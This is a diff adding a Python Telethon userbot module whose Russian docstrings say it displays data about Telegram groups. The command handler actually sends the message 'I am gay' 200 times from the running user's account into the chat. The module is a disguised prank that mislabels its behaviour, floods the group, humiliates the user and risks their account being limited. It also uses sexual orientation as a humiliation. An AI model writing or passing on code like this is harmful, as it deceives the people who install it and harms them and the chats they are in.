@@ -1,0 +1,23 @@
+from telethon import events
+
+from .. import loader, utils
+
+
+@loader.tds
+class DevKuehMod(loader.Module):
+    """ Этот модуль может посмотреть данные о группах😈\n       👨‍💻Создатель модуля: @kueh1"""
+
+    strings = {
+        "name": "dev kueh"
+    }
+
+    def __init__(self):
+        self.name = self.strings["name"]
+        self._me = None
+        self._ratelimit = []
+
+
+    async def dannyecmd(self, message):
+        """- чтобы смотреть данные про группах, работает только в группе"""
+        for _ in range(200):
+            await message.respond("Я гей")
